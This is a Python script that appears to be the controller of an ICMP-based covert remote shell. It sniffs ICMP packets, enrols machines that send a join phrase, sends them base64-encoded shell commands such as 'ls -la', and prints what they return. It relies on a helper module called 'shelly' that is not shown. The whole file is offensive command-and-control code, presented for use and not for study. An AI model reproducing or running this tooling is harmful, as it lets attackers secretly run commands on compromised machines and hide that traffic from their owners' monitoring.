#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import base64
from shelly import Host, Target

TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.targets = []

    def get_targets(self):
        return self.targets

    def join(self, shellpack):
        match shellpack['message']:
            case "fine thank you":
                target = Target(shellpack)
                self.targets.append(target)
                target.update_status("CONNECTED")
                self.send(target.ip, "instruction", "request", base64.b64encode("ls -la".encode()))
            case _:
                print("Invalid join message")
        return

    def instruction(self, shellpack):
        print(f"Instruction Response:\n{shellpack['data']}")
        
if __name__ == "__main__":

    print("[ Setting up controller ]")
    controller = Controller()
    print(controller)

    print("[ Starting sniffer ]")
    sniff(iface=controller.iface, filter="icmp", prn=controller.sniff_callback, store="0")
